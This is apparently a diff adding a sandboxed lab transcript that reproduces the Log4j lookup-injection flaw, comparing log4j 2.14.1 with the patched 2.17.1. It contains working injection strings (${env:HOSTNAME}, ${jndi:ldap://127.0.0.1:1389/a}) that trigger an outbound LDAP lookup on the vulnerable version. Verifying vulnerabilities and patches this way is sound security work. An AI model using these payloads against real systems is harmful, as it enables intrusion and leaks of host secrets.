@@ -1,0 +1,23 @@
+$ ls lib-2.14.1 lib-2.17.1
+lib-2.14.1:
+log4j-api-2.14.1.jar
+log4j-core-2.14.1.jar
+
+lib-2.17.1:
+log4j-api-2.17.1.jar
+log4j-core-2.17.1.jar
+$ docker run --rm --network none --hostname lab --add-host lab:127.0.0.1 --user "$(id -u):$(id -g)" -v "$PWD":/w -w /w --entrypoint javac maven:3.9-eclipse-temurin-21 -proc:none -cp 'lib-2.17.1/*' -d out Demo.java && ls out
+Demo.class
+$ docker run --rm --network none --hostname lab --add-host lab:127.0.0.1 --user "$(id -u):$(id -g)" -v "$PWD":/w -w /w --entrypoint java maven:3.9-eclipse-temurin-21 -Dlog4j.configurationFile=log4j2.xml -cp 'lib-2.14.1/*:out' Demo 'Mozilla/5.0 ${java:version} ${env:HOSTNAME}'
+20:38:38 INFO  login failed, user-agent=Mozilla/5.0 Java version 21.0.12.1 lab
+$ docker run --rm --network none --hostname lab --add-host lab:127.0.0.1 --user "$(id -u):$(id -g)" -v "$PWD":/w -w /w --entrypoint java maven:3.9-eclipse-temurin-21 -Dlog4j.configurationFile=log4j2.xml -cp 'lib-2.17.1/*:out' Demo 'Mozilla/5.0 ${java:version} ${env:HOSTNAME}'
+20:38:40 INFO  login failed, user-agent=Mozilla/5.0 ${java:version} ${env:HOSTNAME}
+$ docker run --rm --network none --hostname lab --add-host lab:127.0.0.1 --user "$(id -u):$(id -g)" -v "$PWD":/w -w /w --entrypoint java maven:3.9-eclipse-temurin-21 -Dlog4j.configurationFile=log4j2.xml -cp 'lib-2.14.1/*:out' Demo '${jndi:ldap://127.0.0.1:1389/a}' 2>&1 | grep -vE '^\s+at ' | cut -c1-200
+>>> tai nghe 127.0.0.1:1389 NHAN 14 byte tu 127.0.0.1 (goi LDAP bind dau tien: 0x30)
+2026-11-23 20:38:43,657 main WARN Error looking up JNDI resource [ldap://127.0.0.1:1389/a]. javax.naming.CommunicationException: LDAP connection has been closed [Root exception is java.io.IOException:
+Caused by: java.io.IOException: LDAP connection has been closed
+	... 42 more
+
+20:38:43 INFO  login failed, user-agent=${jndi:ldap://127.0.0.1:1389/a}
+$ docker run --rm --network none --hostname lab --add-host lab:127.0.0.1 --user "$(id -u):$(id -g)" -v "$PWD":/w -w /w --entrypoint java maven:3.9-eclipse-temurin-21 -Dlog4j.configurationFile=log4j2.xml -cp 'lib-2.17.1/*:out' Demo '${jndi:ldap://127.0.0.1:1389/a}' 2>&1 | grep -vE '^\s+at ' | cut -c1-200
+20:38:46 INFO  login failed, user-agent=${jndi:ldap://127.0.0.1:1389/a}
